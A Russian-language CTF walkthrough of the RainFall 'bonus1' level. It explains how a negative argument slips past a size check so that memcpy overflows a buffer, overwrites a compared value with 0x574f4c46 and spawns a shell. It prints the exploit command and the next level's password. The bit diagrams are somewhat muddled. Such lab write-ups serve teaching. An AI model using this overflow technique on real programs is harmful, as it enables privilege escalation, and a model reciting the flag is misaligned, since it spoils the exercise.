Мы можем найти исполняемый файл, который сегментируется без аргументов и ничего не делает

После анализа с помощью gdb мы находим только функцию main().

Существует вызов memcpy(), который уязвим для переполнения буфера.
Программа принимает два аргумента :

Первый аргумент преобразуется в целое число с помощью atoi(), назовем его nb. Если мы хотим получить доступ к memcpy(), nb должно быть меньше или равно 9.
    Второй аргумент копируется в буфер, расположенный на 40 байт выше местоположения возврата atoi(). Затем nb сравнивается с 0x574f4c46, если он равен вызову программы execl().
    Проблема в том, что memcpy() скопирует только 4*nb байт argv[2]. Таким образом, 36 - это максимальное количество байтов, которое можно скопировать в буфер (9 * 4 = 36).
    Вместо положительного nb мы можем предоставить memcpy отрицательный nb.
    Как это работает? Значение nb хранится в DWORD (32 бита), минимальное значение 32-разрядного целого числа со знаком равно -2147483647.

                                                   32 bits
                                                      |
int_min     = 0000 0000 0000 0000 0000 0000 0000 0000 | 1000 0000 0000 0000 0000 0000 0000 0001 = -2147483647
int_min * 4 = 1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0000 0100 = 4

Мы видим, что после 32 бит остальное игнорируется, поэтому мы немного схитрим.
Если мы изменим первые 32 бита int_min*4, чтобы получить 44 (0b101100), мы сможем получить хорошее десятичное число для предоставления.

                                                    32 bits
                                                       |
random_int   = 1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0010 1100 = 44 (-8589934548)
random_int/4 = -2147483637

Теперь у нас есть наш первый аргумент: -2147483637, который меньше 9 и даст нам 44, если умножить на 4.
Для второго аргумента нам нужно заполнить буфер первыми 40 байтами (заполнение). Затем последние 4 байта удалят значение nb и заменят его на 0x574f4c46.

bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ exit
bonus1@RainFall:~$ su bonus2
